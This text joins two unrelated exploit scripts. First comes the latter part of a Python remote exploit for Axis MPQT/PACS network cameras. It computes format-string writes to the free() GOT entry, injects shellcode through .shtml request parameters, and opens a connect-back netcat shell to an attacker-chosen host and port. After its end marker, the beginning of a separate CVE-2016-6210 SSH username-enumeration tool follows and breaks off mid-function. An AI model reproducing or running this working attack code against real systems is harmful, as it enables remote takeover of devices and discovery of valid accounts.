				0x101fc,	# Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
				61,		# 1st POP's
				115,		# 2nd POP's
				143,		# 3rd POP's
				118,		# 4th POP's
				'NCSH2'		# Shellcode type (Netcat Shell)
		],
#
# Using POP format string, AKA 'Old Style'
#

		# MPQT
		'ARM-NCSH-5.5x': [		# 
				0x1c15c,	# Adjust to GOT free() address
				0xfdcc,		# Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
				97,		# 1st POP's
				0,		# 2nd POP's
				41,		# 3rd POP's
				0,		# 4th POP's
				'NCSH1'		# Shellcode type (Netcat Shell)
		],

		# MPQT
		'ARM-NCSH-5.6x': [		# 
				0x1c15c,	# Adjust to GOT free() address
				0xfcec,		# Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
				97,		# 1st POP's
				0,		# 2nd POP's
				41,		# 3rd POP's
				0,		# 4th POP's
				'NCSH1'		# Shellcode type (Netcat Shell)
		],

		# MPQT
		'ARM-NCSH-5.7x': [		# 
				0x1c1c0,	# Adjust to GOT free() address
				0xf800,		# Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
				132,		# 1st POP's
				0,		# 2nd POP's
				34,		# 3rd POP's
				0,		# 4th POP's
				'NCSH1'		# Shellcode type (Netcat Shell)
		],

		# Will go in endless loop after exit of nc shell... DoS sux
		# MPQT
		'ARM-NCSH-5.8x': [		# 
				0x1b39c,	# Adjust to GOT free() address
				0xf8c0,		# Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
				98,		# 1st POP's
				0,		# 2nd POP's
				34,		# 3rd POP's
				1,		# 4th POP's
				'NCSH1'		# Shellcode type (Netcat Shell)
		],

		# MPQT
		'ARM-NCSH-6.1x': [		# 
				0x1d2a4,	# Adjust to GOT free() address
#				0xecc4,		# Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
				0xecc8,		# Adjust to "/bin/sh -c; pipe(); vfork(); execve()"
				106,		# 1st POP's
				0,		# 2nd POP's
				34,		# 3rd POP's
				1,		# 4th POP's
				'NCSH1'		# Shellcode type (Netcat Shell)
		],
#
# Using POP format string, AKA 'Old Style'
#

		# MPQT
		'CRISv32-5.5x': [		# 
				0x8d148,	# Adjust to GOT free() address
				0x8f5a8,	# .bss shellcode address
				4,		# 1st POP's
				13,		# 2nd POP's
				'axis',		# Aligns injected code
				470,		# How big buffer before shellcode
				'CRISv32'	# Shellcode type (Crisv32)
		],

		# MPQT
		'CRISv32-5.4x': [		# 
				0x8d0e0,	# Adjust to GOT free() address
				0x8f542,	# .bss shellcode address
				4,		# 1st POP's
				13,		# 2nd POP's
				'axis',		# Aligns injected code
				470,		# How big buffer before shellcode
				'CRISv32'	# Shellcode type (Crisv32)
		],

		# MPQT
		'CRISv32-5.2x': [		# 
				0x8d0b4,	# Adjust to GOT free() address
				0x8f4d6,	# .bss shellcode address
				4,		# 1st POP's
				13,		# 2nd POP's
				'axis',		# Aligns injected code
				470,		# How big buffer before shellcode
				'CRISv32'	# Shellcode type (Crisv32)
		],

		# MPQT
		'CRISv32-5.20.0': [		# 
				0x8d0e4,	# Adjust to GOT free() address
				0x8f546,	# .bss shellcode address
				4,		# 1st POP's
				13,		# 2nd POP's
				'axis',		# Aligns injected code
				470,		# How big buffer before shellcode
				'CRISv32'	# Shellcode type (Crisv32)
		]


	}

		if self.target == 0:
			return target_db
			
		if not self.target in target_db:
			print "[!] Unknown FMS key: %s!" % self.target
			sys.exit(1)
	
		if self.verbose:
			print "[Verbose] Number of availible FMS keys:",len(target_db)

		return target_db


#
# Validate correctness of HOST, IP and PORT
#
class Validate:

	def __init__(self,verbose):
		self.verbose = verbose

	# Check if IP is valid
	def CheckIP(self,IP):
		self.IP = IP

		ip = self.IP.split('.')
		if len(ip) != 4:
			return False
		for tmp in ip:
			if not tmp.isdigit():
				return False
		i = int(tmp)
		if i < 0 or i > 255:
			return False
		return True

	# Check if PORT is valid
	def Port(self,PORT):
		self.PORT = PORT

		if int(self.PORT) < 1 or int(self.PORT) > 65535:
			return False
		else:
			return True

	# Check if HOST is valid
	def Host(self,HOST):
		self.HOST = HOST

		try:
			# Check valid IP
			socket.inet_aton(self.HOST) # Will generate exeption if we try with FQDN or invalid IP
			# Or we check again if it is correct typed IP
			if self.CheckIP(self.HOST):
				return self.HOST
			else:
				return False
		except socket.error as e:
			# Else check valid DNS name, and use the IP address
			try:
				self.HOST = socket.gethostbyname(self.HOST)
				return self.HOST
			except socket.error as e:
				return False



if __name__ == '__main__':

#
# Help, info and pre-defined values
#	
	INFO = '[Axis Communications MPQT/PACS remote exploit 2016 bashis <mcw noemail eu>]'
	HTTP = "http"
	HTTPS = "https"
	proto = HTTP
	verbose = False
	noexploit = False
	lhost = '192.168.0.1'	# Default Local HOST
	lport = '31337'		# Default Local PORT
	rhost = '192.168.0.90'	# Default Remote HOST
	rport = '80'		# Default Remote PORT
	#  Not needed for the SSI exploit, here for possible future usage.
#	creds = 'root:pass'
	creds = False

#
# Try to parse all arguments
#
	try:
		arg_parser = argparse.ArgumentParser(
#		prog=sys.argv[0],
		prog='axis-ssid-PoC.py',
                description=('[*]' + INFO + '\n'))
		arg_parser.add_argument('--rhost', required=False, help='Remote Target Address (IP/FQDN) [Default: '+ rhost +']')
		arg_parser.add_argument('--rport', required=False, help='Remote Target HTTP/HTTPS Port [Default: '+ rport +']')
		arg_parser.add_argument('--lhost', required=False, help='Connect Back Address (IP/FQDN) [Default: '+ lhost +']')
		arg_parser.add_argument('--lport', required=False, help='Connect Back Port [Default: '+ lport + ']')
		arg_parser.add_argument('--fms', required=False, help='Manual FMS key')
		if creds:
			arg_parser.add_argument('--auth', required=False, help='Basic Authentication [Default: '+ creds + ']')
		arg_parser.add_argument('--https', required=False, default=False, action='store_true', help='Use HTTPS for remote connection [Default: HTTP]')
		arg_parser.add_argument('-v','--verbose', required=False, default=False, action='store_true', help='Verbose mode [Default: False]')
		arg_parser.add_argument('--noexploit', required=False, default=False, action='store_true', help='Simple testmode; With --verbose testing all code without exploiting [Default: False]')
		arg_parser.add_argument('--dict', required=False, default=False, action='store_true', help='Print FMS keys and stats from dictionary, additional details with --verbose')
		args = arg_parser.parse_args()
	except Exception as e:
		print INFO,"\nError: %s\n" % str(e)
		sys.exit(1)

	# We want at least one argument, so print out help
	if len(sys.argv) == 1:
		arg_parser.parse_args(['-h'])

	print "\n[*]",INFO

	if args.verbose:
		verbose = args.verbose

	# Print out info from dictionary
	if args.dict:
		target = FMSdb(rhost,verbose).FMSkey(0)
		print "[db] Number of FMS keys:",len(target)

		# Print out detailed info from dictionary
		if verbose:

			print "[db] Target details of FMS Keys availible for manual xploiting"
			print "\n[FMS Key]\t[GOT Address]\t[BinSh Address]\t[POP1]\t[POP2]\t[POP3]\t[POP4]\t[Shellcode]"

			for tmp in range(0,len(target)):
				Key = sorted(target.keys())[tmp]
				temp = re.split('[-]',Key)[0:10]

				if temp[1] == 'NCSH':
					print Key,'\t','0x{:08x}'.format(target[Key][0]),'\t','0x{:08x}'.format(target[Key][1]),'\t',target[Key][2],'\t',target[Key][3],'\t',target[Key][4],'\t',target[Key][5],'\t',target[Key][6]

			print "\n[FMS Key]\t[GOT Address]\t[BSS Address]\t[POP1]\t[POP2]\t[Align]\t[Buf]\t[Shellcode]"
			for tmp in range(0,len(target)):
				Key = sorted(target.keys())[tmp]
				temp = re.split('[-]',Key)[0:10]

				if temp[1] != 'NCSH':
					print Key,'\t','0x{:08x}'.format(target[Key][0]),'\t','0x{:08x}'.format(target[Key][1]),'\t',target[Key][2],'\t',target[Key][3],'\t',len(target[Key][4]),'\t',target[Key][5],'\t',target[Key][6]

			print "\n"
		else:
			print "[db] Target FMS Keys availible for manual xploiting instead of using auto mode:"
			Key = ""
			for tmp in range(0,len(target)):
				Key += sorted(target.keys())[tmp]
				Key += ', '
			print '\n',Key,'\n'
		sys.exit(0)

#
# Check validity, update if needed, of provided options
#
	if args.https:
		proto = HTTPS
		if not args.rport:
			rport = '443'

	if creds and args.auth:
		creds = args.auth

	if args.noexploit:
		noexploit = args.noexploit

	if args.rport:
		rport = args.rport

	if args.rhost:
		rhost = args.rhost

	if args.lport:
		lport = args.lport

	if args.lhost:
		lhost = args.lhost

	# Check if LPORT is valid
	if not Validate(verbose).Port(lport):
		print "[!] Invalid LPORT - Choose between 1 and 65535"
		sys.exit(1)

	# Check if RPORT is valid
	if not Validate(verbose).Port(rport):
		print "[!] Invalid RPORT - Choose between 1 and 65535"
		sys.exit(1)

	# Check if LHOST is valid IP or FQDN, get IP back
	lhost = Validate(verbose).Host(lhost)
	if not lhost:
		print "[!] Invalid LHOST"
		sys.exit(1)

	# Check if RHOST is valid IP or FQDN, get IP back
	rhost = Validate(verbose).Host(rhost)
	if not rhost:
		print "[!] Invalid RHOST"
		sys.exit(1)


#
# Validation done, start print out stuff to the user
#
	if noexploit:
		print "[i] Test mode selected, no exploiting..."
	if args.https:
		print "[i] HTTPS / SSL Mode Selected"
	print "[i] Remote target IP:",rhost
	print "[i] Remote target PORT:",rport
	print "[i] Connect back IP:",lhost
	print "[i] Connect back PORT:",lport

	rhost = rhost + ':' + rport

#
# FMS key is required into this PoC
#
	if not args.fms:
		print "[!] FMS key is required!"
		sys.exit(1)
	else:
		Key = args.fms
		print "[i] Trying with FMS key:",Key

#
# Prepare exploiting
#
	# Look up the FMS key in dictionary and return pointer for FMS details to use
	target = FMSdb(rhost,verbose).FMSkey(Key)

	if target[Key][6] == 'NCSH1':
		NCSH1 = target[Key][6]
		NCSH2 = ""
	elif target[Key][6] == 'NCSH2':
		NCSH2 = target[Key][6]
		NCSH1 = ""
	else:
		NCSH1 = ""
		NCSH2 = ""
	
	if Key == 'ARM-NCSH-5.8x':
		print "\nExploit working, but will end up in endless loop after exiting remote NCSH\nDoS sux, so I'm exiting before that shit....\n\n"
		sys.exit(0)

	print "[i] Preparing shellcode:",str(target[Key][6])

	# We don't use url encoded shellcode with Netcat shell
	# This is for MIPS/CRISv32 and ARM shellcode
	if not NCSH1 and not NCSH2:
		FMSdata = target[Key][4]		# This entry aligns the injected shellcode

		# Building up the url encoded shellcode for sending to the target,
		# and replacing LHOST / LPORT in shellcode to choosen values
		
		# part of first 500 decoded bytes will be overwritten during stage #2, and since
		# there is different 'tailing' on the request internally, keep it little more than needed, to be safe.
		# Let it be 0x00, just for fun.
		FMSdata += '%00' * target[Key][5]

		# Connect back IP to url encoded
		ip_hex = '%{:02x} %{:02x} %{:02x} %{:02x}'.format(*map(int, lhost.split('.')))
		ip_hex = ip_hex.split()
		IP1=ip_hex[0];IP2=ip_hex[1];IP3=ip_hex[2];IP4=ip_hex[3];

		# Let's break apart the hex code of LPORT into two bytes
		port_hex = hex(int(lport))[2:]
		port_hex = port_hex.zfill(len(port_hex) + len(port_hex) % 2)
		port_hex = ' '.join(port_hex[i: i+2] for i in range(0, len(port_hex), 2))
		port_hex = port_hex.split()
	
		if (target[Key][6]) == 'MIPSel':
			# Connect back PORT
			if len(port_hex) == 1:
				PP1 = "%ff"
				PP0 = '%{:02x}'.format((int(port_hex[0],16)-1))
			elif len(port_hex) == 2:
				# Little Endian
				PP1 = '%{:02x}'.format((int(port_hex[0],16)-1))
				PP0 = '%{:02x}'.format(int(port_hex[1],16))
		elif (target[Key][6]) == 'ARMel': # Could be combinded with CRISv32
			# Connect back PORT
			if len(port_hex) == 1:
				PP1 = "%00"
				PP0 = '%{:02x}'.format(int(port_hex[0],16))
			elif len(port_hex) == 2:
				# Little Endian
				PP1 = '%{:02x}'.format(int(port_hex[0],16))
				PP0 = '%{:02x}'.format(int(port_hex[1],16))
		elif (target[Key][6]) == 'CRISv32':
			# Connect back PORT
			if len(port_hex) == 1:
				PP1 = "%00"
				PP0 = '%{:02x}'.format(int(port_hex[0],16))
			elif len(port_hex) == 2:
				# Little Endian
				PP1 = '%{:02x}'.format(int(port_hex[0],16))
				PP0 = '%{:02x}'.format(int(port_hex[1],16))
		else:
			print "[!] Unknown shellcode! (%s)" % str(target[Key][6])
			sys.exit(1)

		# Replace LHOST / LPORT in URL encoded shellcode
		shell = shellcode_db(rhost,verbose).sc(target[Key][6])
		shell = shell.replace("IP1",IP1)
		shell = shell.replace("IP2",IP2)
		shell = shell.replace("IP3",IP3)
		shell = shell.replace("IP4",IP4)
		shell = shell.replace("PP0",PP0)
		shell = shell.replace("PP1",PP1)
		FMSdata += shell

#
# Calculate the FMS values to be used
#
	# Get pre-defined values
	ALREADY_WRITTEN = 40	# Already 'written' in the daemon before our FMS
#	POP_SIZE = 8
	POP_SIZE = 1

	GOThex = target[Key][0]
	BSShex = target[Key][1]
	GOTint = int(GOThex)

	# 'One-Write-Where-And-What'
	if not NCSH1 and not NCSH2:

		POP1 = target[Key][2]
		POP2 = target[Key][3]

		# Calculate for creating the FMS code
		ALREADY_WRITTEN = ALREADY_WRITTEN + (POP1 * POP_SIZE)
		GOTint = (GOTint - ALREADY_WRITTEN)
	
		ALREADY_WRITTEN = ALREADY_WRITTEN + (POP2 * POP_SIZE)

		BSSint = int(BSShex)
		BSSint = (BSSint - GOTint - ALREADY_WRITTEN)

#		if verbose:
#			print "[Verbose] Calculated GOTint:",GOTint,"Calculated BSSint:",BSSint

	# 'Two-Write-Where-And-What' using "New Style"
	elif NCSH2:

		POP1 = target[Key][2]
		POP2 = target[Key][3]
		POP3 = target[Key][4]
		POP4 = target[Key][5]
 		POP2_SIZE = 2
		
 		# We need to count higher than provided address for the jump
		BaseAddr = 0x10000 + BSShex
	
		# Calculate for creating the FMS code
		GOTint = (GOTint - ALREADY_WRITTEN)

		ALREADY_WRITTEN = ALREADY_WRITTEN + GOTint
		
		# Calculate FirstWhat value
		FirstWhat = BaseAddr - (ALREADY_WRITTEN)
		
		ALREADY_WRITTEN = ALREADY_WRITTEN + FirstWhat

		# Calculate SecondWhat value, so it always is 0x20300
		SecondWhat = 0x20300 - (ALREADY_WRITTEN + POP2_SIZE)

		shell = shellcode_db(rhost,verbose).sc(target[Key][6])
		shell = shell.replace("LHOST",lhost)
		shell = shell.replace("LPORT",lport)

		FirstWhat = FirstWhat - len(shell)

#		if verbose:
#			print "[Verbose] Calculated GOTint:",GOTint,"Calculated FirstWhat:",FirstWhat,"Calculated SecondWhat:",SecondWhat
	
	
	# 'Two-Write-Where-And-What' using "Old Style"
	elif NCSH1:

		POP1 = target[Key][2]
		POP2 = target[Key][3]
		POP3 = target[Key][4]
		POP4 = target[Key][5]
		POP2_SIZE = 2

		# FirstWhat writes with 4 bytes (Y) (0x0002YYYY)
		# SecondWhat writes with 1 byte (Z) (0x00ZZYYYY)
		if BSShex > 0x10000:
			MSB = 1
		else:
			MSB = 0

 		# We need to count higher than provided address for the jump
		BaseAddr = 0x10000 + BSShex

		# Calculate for creating the FMS code
		ALREADY_WRITTEN = ALREADY_WRITTEN + (POP1 * POP_SIZE)
		
		GOTint = (GOTint - ALREADY_WRITTEN)
		
		ALREADY_WRITTEN = ALREADY_WRITTEN + GOTint + POP2_SIZE + (POP3 * POP_SIZE)
		
		# Calculate FirstWhat value
		FirstWhat = BaseAddr - (ALREADY_WRITTEN)
		
		ALREADY_WRITTEN = ALREADY_WRITTEN + FirstWhat + (POP4 * POP_SIZE)

		# Calculate SecondWhat value, so it always is 0x203[00] or [01]
		SecondWhat = 0x20300 - (ALREADY_WRITTEN) + MSB

		shell = shellcode_db(rhost,verbose).sc(target[Key][6])
		shell = shell.replace("LHOST",lhost)
		shell = shell.replace("LPORT",lport)

		GOTint = GOTint - len(shell)

#		if verbose:
#			print "[Verbose] Calculated GOTint:",GOTint,"Calculated FirstWhat:",FirstWhat,"Calculated SecondWhat:",SecondWhat
	
	else:
		print "[!] NCSH missing, exiting"
		sys.exit(1)
#
# Let's start the exploiting procedure
#

#
# Stage one
#
	if NCSH1 or NCSH2:

		# "New Style" needs to make the exploit in two stages
		if NCSH2:
			FMScode = do_FMS(rhost,verbose)
			# Writing 'FirstWhere' and 'SecondWhere'
			# 1st request
			FMScode.AddADDR(GOTint) # Run up to free() GOT address
			#
			# 1st and 2nd "Write-Where"
			FMScode.AddDirectParameterN(POP1)	# Write 1st Where
			FMScode.Add("XX")			# Jump up two bytes for next address
			FMScode.AddDirectParameterN(POP2)	# Write 2nd Where
			FMSdata = FMScode.FMSbuild()
		else:
			FMSdata = ""

		print "[>] StG_1: Preparing netcat connect back shell to address:",'0x{:08x}'.format(BSShex),"(%d bytes)" % (len(FMSdata))
	else:
		print "[>] StG_1: Sending and decoding shellcode to address:",'0x{:08x}'.format(BSShex),"(%d bytes)" % (len(FMSdata))

	# Inject our encoded shellcode to be decoded in MIPS/CRISv32/ARM
	# Actually, any valid and public readable .shtml file will work...
	# (One of the two below seems always to be usable)
	#
	# For NCSH1 shell, we only check if the remote file are readable, for usage in Stage two
	# For NCSH2, 1st and 2nd (Write-Where) FMS comes here, and calculations start after '=' in the url
	#
	try:
		target_url = "/httpDisabled.shtml?user_agent="
		if noexploit:
			target_url2 = target_url
		else:
			target_url2 = "/httpDisabled.shtml?&http_user="

		if NCSH2:
			html = HTTPconnect(rhost,proto,verbose,creds,noexploit).RAW(target_url2 + FMSdata) # Netcat shell
		else:
			html = HTTPconnect(rhost,proto,verbose,creds,noexploit).Send(target_url + FMSdata)
	except urllib2.HTTPError as e:
		if e.code == 404:
			print "[<] Error",e.code,e.reason
			target_url = "/view/viewer_index.shtml?user_agent="
			if noexploit:
				target_url2 = target_url
			else:
				target_url2 = "/view/viewer_index.shtml?&http_user="
			print "[>] Using alternative target shtml"
			if NCSH2:
				html = HTTPconnect(rhost,proto,verbose,creds,noexploit).RAW(target_url2 + FMSdata) # Netcat shell
			else:
				html = HTTPconnect(rhost,proto,verbose,creds,noexploit).Send(target_url + FMSdata)
	except Exception as e:
		if not NCSH2:
			print "[!] Shellcode delivery failed:",str(e)
			sys.exit(1)
#
# Stage two
#

#
# Building and sending the FMS code to the target
#
	print "[i] Building the FMS code..."

	FMScode = do_FMS(rhost,verbose)

	# This is an 'One-Write-Where-And-What' for FMS
	#
	# Stack Example:
	#
	# Stack content	|	Stack address (ASLR)
	#
	# 0x0		|	@0x7e818dbc -> [POP1's]
	# 0x0		|	@0x7e818dc0 -> [free () GOT address]
	# 0x7e818dd0	|	@0x7e818dc4>>>>>+ "Write-Where" (%n)
	# 0x76f41fb8	|	@0x7e818dc8     | -> [POP2's]
	# 0x76f3d70c	|	@0x7e818dcc     | -> [BSS shell code address]
	# 0x76f55ab8	|	@0x7e818dd0<<<<<+ "Write-What" (%n)
	# 0x1		|	@0x7e818dd4
	#
	if not NCSH1 and not NCSH2:
		FMScode.AddPOP(POP1)		# 1st serie of 'Old Style' POP's 
		FMScode.AddADDR(GOTint)		# GOT Address
		FMScode.AddWRITEn(1)		# 4 bytes Write-Where
#		FMScode.AddWRITElln(1)		# Easier to locate while debugging as this will write double word (0x00000000004xxxxx)

		FMScode.AddPOP(POP2)		# 2nd serie of 'Old Style' POP's
		FMScode.AddADDR(BSSint)		# BSS shellcode address
		FMScode.AddWRITEn(1)		# 4 bytes Write-What
#		FMScode.AddWRITElln(1)		# Easier to locate while debugging as this will write double word (0x00000000004xxxxx)

	# End of 'One-Write-Where-And-What'


	# This is an 'Two-Write-Where-And-What' for FMS
	#
	# Netcat shell and FMS code in same request, we will jump to the SSI function <!--#exec cmd="xxx" -->
	# We jump over all SSI tagging to end up directly where "xxx" will
	# be the string passed on to SSI exec function ('/bin/sh -c', pipe(), vfork() and execv())
	#
	# The Trick here is to write lower target address, that we will jump to when calling free(),
	# than the FMS has counted up to, by using Two-Write-Where-and-What with two writes to free() GOT
	# address with two LSB writes.
	#
	elif NCSH2:
		#
		# Direct parameter access for FMS exploitation are really nice and easy to use.
		# However, we need to exploit in two stages with two requests.
		# (I was trying to avoid this "Two-Stages" so much as possibly in this exploit developement...)
		#
		# 1. Write "Two-Write-Where", where 2nd is two bytes higher than 1st (this allows us to write to MSB and LSB)
		# 2. Write with "Two-Write-What", where 1st (LSB) and 2nd (MSB) "Write-Where" pointing to.
		# 
		# With "new style", we can write with POPs independently as we don't depended of same criteria as in "NCSH1",
		# we can use any regular "Stack-to-Stack" pointer as we can freely choose the POP-and-Write.
		# [Note the POP1/POP2 (low-high) vs POP3/POP4 (high-low) difference.]
		#
		# Stack Example:
		#
		# Stack content	|	Stack address (ASLR)
		#
		# 0x7e818dd0	|	@0x7e818dc4>>>>>+ 1st "Write-Where" [@Stage One]
		# 0x76f41fb8	|	@0x7e818dc8     |
		# 0x76f3d70c	|	@0x7e818dcc     |
		# 0x76f55ab8	|	@0x7e818dd0<<<<<+ 1st "Write-What" [@Stage Two]
		# 0x1		|	@0x7e818dd4
		# [....]
		# 0x1c154	|	@0x7e818e10
		# 0x7e818e20	|	@0x7e818e14>>>>>+ 2nd "Write-Where" [@Stage One]
		# 0x76f41fb8	|	@0x7e818e18     |
		# 0x76f3d70c	|	@0x7e818e1c     |
		# 0x76f55758	|	@0x7e818e20<<<<<+ 2nd "Write-What" [@Stage Two]
		# 0x1		|	@0x7e818e24
		#

		FMScode.Add(shell)

		#
		# 1st and 2nd "Write-Where" already done in stage one
		#
		# 1st and 2nd "Write-What"
		#
		FMScode.AddADDR(GOTint + FirstWhat)	# Run up to 0x0002XXXX, write with LSB (0xXXXX) to LSB in target address.
		FMScode.AddDirectParameterN(POP3)	# Write with 4 bytes (we want to zero out in MSB)
		FMScode.AddADDR(SecondWhat + 3)		# Run up to 0x00020300, write with LSB (0xZZ) to lower part of MSB. (0x00ZZXXXX)
		FMScode.AddDirectParameterHHN(POP4)	# Write with one byte 0x000203[00] or 0x000203[01] depending from above calculation

	elif NCSH1:
		# Could use direct argument addressing here, but I like to keep "old style" as well,
		# as it's another interesting concept.
		#
		# Two matching stack contents -> stack address in row w/o or max two POP's between,
		# is needed to write two bytes higher (MSB).
		# 
		#
		# Stack Example:
		#
		# Stack Content	|	@Stack Address (ASLR)
		#
		# 0x9c		|	@7ef2fde8 -> [POP1's]
		# [....]
		# 0x1		|	@7ef2fdec -> [GOTint address]
		#------
		# 0x7ef2fe84	|	@7ef2fdf0 >>>>>+     Write 'FirstWhere' (%n) [LSB]
		#                       -> 'XX'        |     two bytes (Can be one or two POP's as well, by using %2c or %1c%1c as POPer)
		# 0x7ef2fe8c	|	@7ef2fdf4 >>>>>>>>>+ Write 'SecondWhere' (%n) [MSB]
		# ------                               |   |
		# [....]                -> [POP3's]    |   |
		# 0x7fb99dc	|	@7ef2fe7c      |   |
		# 0x7ef2fe84	|	@7ef2fe80      |   | [Count up to 0x2XXXX]
		# 0x7ef2ff6a	|	@7ef2fe84 <<<<<+   | Write 'XXXX' 'FirstWhat' (%n) (0x0002XXXX))
		#                       -> [POP4's]        |
		# (nil)		|	@7ef2fe88          | [Count up to 0x20300]
		# 0x7ef2ff74	|	@7ef2fe8c <<<<<<<<<+ Write 'ZZ' 'SecondWhat' (%hhn) (0x00ZZXXXX)

		FMScode.Add(shell)

		# Write FirstWhere for 'FirstWhat'
		FMScode.AddPOP(POP1)
		FMScode.AddADDR(GOTint) # Run up to free() GOT address
		FMScode.AddWRITEn(1)

		# Write SecondWhere for 'SecondWhat'
		#
		# This is special POP with 1 byte, we can maximum POP 2!
		#
		# This POP sequence is actually no longer used in this part of exploit, was developed to meet the requirement
		# for exploitation of 5.2.x and 5.40.x, as there needed to be one POP with maximum of two bytes.
		# Kept as reference as we now using direct parameter access AKA 'New Style" for 5.2x/5.4x
		#
		if POP2 != 0:
			# We only want to write 'SecondWhat' two bytes higher at free() GOT
			if POP2 > 2:
				print "POP2 can't be greater than two!"
				sys.exit(1)
			if POP2 == 1:
				FMScode.Add("%2c")
			else:
				FMScode.Add("%1c%1c")
		else:
			FMScode.Add("XX")
		FMScode.AddWRITEn(1)

		# Write FirstWhat pointed by FirstWhere
		FMScode.AddPOP(POP3)		# Old Style POP's
		FMScode.AddADDR(FirstWhat)	# Run up to 0x0002XXXX, write with LSB (0xXXXX) to LSB in target address.
		FMScode.AddWRITEn(1)		# Write with 4 bytes (we want to zero out in MSB)
		
		# Write SecondWhat pointed by SecondWhere
		FMScode.AddPOP(POP4)		# Old Style POP's
		FMScode.AddADDR(SecondWhat)	# Run up to 0x00020300, write with LSB (0xZZ) to lower part of MSB. (0x00ZZXXXX)
		FMScode.AddWRITEhhn(1)		# Write with one byte 0x000203[00] or 0x000203[01] depending from above calculation

	else:
		sys.exit(1)

	FMSdata = FMScode.FMSbuild()

	print "[>] StG_2: Writing shellcode address to free() GOT address:",'0x{:08x}'.format(GOThex),"(%d bytes)" % (len(FMSdata))

	# FMS comes here, and calculations start after '=' in the url
	try:
		if NCSH1 or NCSH2:
			html = HTTPconnect(rhost,proto,verbose,creds,noexploit).RAW(target_url2 + FMSdata) # Netcat shell
		else:
			html = HTTPconnect(rhost,proto,verbose,creds,noexploit).Send(target_url2 + FMSdata) # MIPS/CRIS shellcode
	except urllib2.HTTPError as e:
		print "[!] Payload delivery failed:",str(e)
		sys.exit(1)
	except Exception as e:
		# 1st string returned by HTTP mode, 2nd by HTTPS mode
		if str(e) == "timed out" or str(e) == "('The read operation timed out',)":
			print "[i] Timeout! Payload delivered sucessfully!"
		else:
			print "[!] Payload delivery failed:",str(e)
			sys.exit(1)

	if noexploit:
		print "\n[*] Not exploiting, no shell...\n"
	else:
		print "\n[*] All done, enjoy the shell...\n"

#
# [EOF]
#
#!/usr/bin/python
#
# CVEs:                  CVE-2016-6210 (Credits for this go to Eddie Harari)
#
# Author:                0_o -- null_null
#                        nu11.nu11 [at] yahoo.com
#                        Oh, and it is n-u-one-one.n-u-one-one, no l's...
#                        Wonder how the guys at packet storm could get this wrong :(
# 
# Date:                  2016-07-19
# 
# Purpose:               User name enumeration against SSH daemons affected by CVE-2016-6210. 
# 
# Prerequisites:         Network access to the SSH daemon.
#
# DISCLAIMER:            Use against your own hosts only! Attacking stuff you are not 
#                        permitted to may put you in big trouble!
#
# And now - the fun part :-)
# 


import paramiko
import time
import numpy
import argparse
import sys

args = None

class bcolors:
  HEADER = '\033[95m'
  OKBLUE = '\033[94m'
  OKGREEN = '\033[92m'
  WARNING = '\033[93m'
  FAIL = '\033[91m'
  ENDC = '\033[0m'
  BOLD = '\033[1m'
  UNDERLINE = '\033[4m'


def get_args():
  parser = argparse.ArgumentParser()
  group = parser.add_mutually_exclusive_group()
  parser.add_argument("host", type = str, help = "Give SSH server address like ip:port or just by ip")
  group.add_argument("-u", "--user", type = str, help = "Give a single user name")
  group.add_argument("-U", "--userlist", type = str, help = "Give a file containing a list of users")
  parser.add_argument("-e", "--enumerated", action = "store_true", help = "Only show enumerated users")
  parser.add_argument("-s", "--silent", action = "store_true", help = "Like -e, but just the user names will be written to stdout (no banner, no anything)")
  parser.add_argument("--bytes", default = 50000, type = int, help = "Send so many BYTES to the SSH daemon as a password")
  parser.add_argument("--samples", default = 12, type = int, help = "Collect so many SAMPLES to calculate a timing baseline for authenticating non-existing users")
  parser.add_argument("--factor", default = 3.0, type = float, help = "Used to compute the upper timing boundary for user enumeration")
  parser.add_argument("--trials", default = 1, type = int, help = "try to authenticate user X for TRIALS times and compare the mean of auth timings against the timing boundary")
  args = parser.parse_args()
  return args


def get_banner(host, port):
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  try:
    ssh.connect(hostname = host, port = port, username = 'invalidinvalidinvalid', password = 'invalidinvalidinvalid')
  except:
    banner = ssh.get_transport().remote_version
    ssh.close()
    return banner


def connect(host, port, user):
  global args
  starttime = 0.0
  endtime = 0.0
  p = 'B' * int(args.bytes)
  ssh = paramiko.SSHClient()
  ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
  starttime=time.clock()
  try:
    ssh.connect(hostname = host, port = port, username = user, password = p, look_for_keys = False, gss_auth = False, gss_kex = False, gss_deleg_creds = False, gss_host = None, allow_agent = False)
  except:
    endtime=time.clock()
  finally:
    ssh.close()
    return endtime - starttime



def main():
  global args
  args = get_args()
  if not args.silent: print("\n\nUser name enumeration against SSH daemons affected by CVE-2016-6210")
  if not args.silent: print("Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari\n\n")
  if args.host:
    host = args.host.split(":")[0]
    try:
      port = int(args.host.split(":")[1])
    except IndexError:
      port = 22
  users = []
  if args.user:
    users.append(args.user)
  elif args.userlist:
    with open(args.userlist, "r") as f:
      users = f.readlines()
  else:
    if not args.silent: print(bcolors.FAIL + "[!] " + bcolors.ENDC + "You must give a user or a list of users")
    sys.exit()
  if not args.silent: print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Testing SSHD at: " + bcolors.BOLD + str(host) + ":" + str(port) + bcolors.ENDC +  ", Banner: " + bcolors.BOLD + get_banner(host, port) + bcolors.ENDC)
  # get baseline timing for non-existing users...
  baseline_samples = []
  baseline_mean = 0.0
  baseline_deviation = 0.0
  if not args.silent: sys.stdout.write(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Getting baseline timing for authenticating non-existing users")
  for i in range(1, int(args.samples) + 1):
    if not args.silent: sys.stdout.write('.')
    if not args.silent: sys.stdout.flush()
    sample = connect(host, port, 'foobar-bleh-nonsense' + str(i))
    baseline_samples.append(sample)
  if not args.silent: sys.stdout.write('\n')
  # remove the biggest and smallest value
  baseline_samples.sort()
  baseline_samples.pop()
  baseline_samples.reverse()
  baseline_samples.pop()
  # do math
  baseline_mean = numpy.mean(numpy.array(baseline_samples))
  baseline_deviation = numpy.std(numpy.array(baseline_samples))
  if not args.silent: print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Baseline mean for host " + host + " is " + str(baseline_mean) + " seconds.")
